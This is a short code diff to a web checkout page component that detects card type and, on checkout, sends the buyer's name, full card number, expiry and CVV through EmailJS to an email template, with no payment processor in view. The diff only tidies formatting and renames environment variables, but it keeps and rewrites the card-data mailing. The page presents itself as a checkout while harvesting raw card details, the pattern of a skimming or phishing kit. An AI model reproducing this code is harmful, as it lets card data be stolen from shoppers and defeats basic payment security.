@@ -44,9 +44,7 @@ export default function CheckoutPage() {
     if (type === 'Visa') setCardImage('/visa.svg');
     if (type === 'Master Card') setCardImage('/mastercard.svg');
     if (type === 'American Express')
-      setCardImage(
-        '/logo-american-express-cards-bank-insurance.png'
-      );
+      setCardImage('/logo-american-express-cards-bank-insurance.png');
   };
 
   // Checkout button click
@@ -57,17 +55,17 @@ export default function CheckoutPage() {
     try {
       // Send email via EmailJS
       await emailjs.send(
-        process.env.service_svegc0i,
-        process.env.template_qquocc7,
+        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
+        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
         {
-          name: Fname,
-          card_number: CNNumber,
-          expiry: expiry,
-          cvv: cvv,
+          name: formData.name,
+          card_number: formData.cardNumber,
+          expiry: formData.expiry,
+          cvv: formData.cvv,
           card_type: cardType,
           amount: '$59.99',
         },
-        process.env.VjoUAxDSePXGF9KMD
+        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY
       );
 
       console.log('Email sent successfully');
